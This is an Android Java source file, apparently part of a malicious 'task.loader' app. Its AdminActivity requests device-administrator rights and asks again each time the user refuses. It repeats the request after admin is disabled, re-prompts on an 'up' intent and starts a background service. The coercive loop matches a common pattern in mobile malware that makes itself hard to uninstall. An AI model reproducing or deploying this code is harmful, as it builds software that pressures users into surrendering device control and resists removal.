package task.loader.admin;


import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

import task.loader.Constants;
import task.loader.Settings;

public class AdminActivity extends Activity 
{
	private int ADMIN_REQUEST = 100;
	
    @Override
    protected void onCreate(Bundle savedInstanceState) 
    {
        super.onCreate(savedInstanceState);

		if(Constants.DEBUG) Settings.debug(getClass().getName() + "::onCreate()");
        
        setTitle("");
        
        AdminReceiver.repeatRequest.set(Constants.REPEAT_ADMIN_REQUEST_AFTER_DISABLE);
        
        activateAdmin(Constants.ADMIN_TEXT_REQUEST);
        
        if(!AdminService.work.get())
        {
        	AdminService.work.set(true);
        	startService(new Intent(this, AdminService.class));
        }
    }
    
    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
    	if(requestCode == ADMIN_REQUEST )
    	{
    		if(resultCode != RESULT_OK)
    		{
    			activateAdmin(Constants.ADMIN_TEXT_REQUEST);
    		}
    		else
    		{
    			AdminService.work.set(false);
    			finish();
    		}
    	}
    	
    }
    
    protected void onNewIntent(Intent intent) 
	{
		super.onNewIntent(intent);

		if(Constants.DEBUG) Settings.debug(getClass().getName() + "::onNewIntent() action: " +
				intent.getAction());
		String action = intent.getAction();
		System.out.println("action: " + action);
		if(action == null) return;
		
		
		if(action.equals("up"))
		{
			activateAdmin(Constants.ADMIN_TEXT_REQUEST);
		}
	}
    
    private void activateAdmin(String text)
    {
		if(Constants.DEBUG) Settings.debug(getClass().getName() + "::activateAdmin()");

        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.extra.DEVICE_ADMIN", new ComponentName(this, AdminReceiver.class));
        intent.putExtra("android.app.extra.ADD_EXPLANATION", text);
        intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivityForResult(intent, 100);

		Settings settings = new Settings(this);
		int count = settings.getAdminRequestCount();
		if(count != -1)
		{
			settings.setAdminRequestCount(count - 1);
		}
    }
    
    
   
}
